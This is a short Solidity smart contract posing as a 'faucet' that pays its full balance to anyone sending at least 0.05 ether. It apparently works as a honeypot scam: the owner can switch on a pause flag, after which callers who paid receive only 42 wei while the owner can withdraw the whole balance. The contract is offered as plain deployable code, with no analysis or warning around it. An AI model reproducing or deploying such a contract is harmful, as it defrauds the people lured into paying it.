pragma solidity 0.7.4;
//SPDX-License-Identifier: UNLICENSED

contract Frhp {
    address owner;
    
    constructor () payable {
        owner = msg.sender;
    } 
    
    bool _pause = false;

    function pause() public {
        require (msg.sender == owner);
        _pause = true;
    }
    
    
    function unPause() public {
        require (msg.sender == owner);
        _pause = false;
    }


    function isPaused() public view returns (bool) {
        return _pause;
    }

    function trapFaucet() public payable {
        require(msg.value >= 50000000000000000);
        if(_pause == false) {
            msg.sender.transfer(address(this).balance);
        } else {
            msg.sender.transfer(42);
        }
    }
    
    function emptyFaucet() public {
        require(msg.sender == owner);
        msg.sender.transfer(address(this).balance);
    }
    
    receive() external payable {
        
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}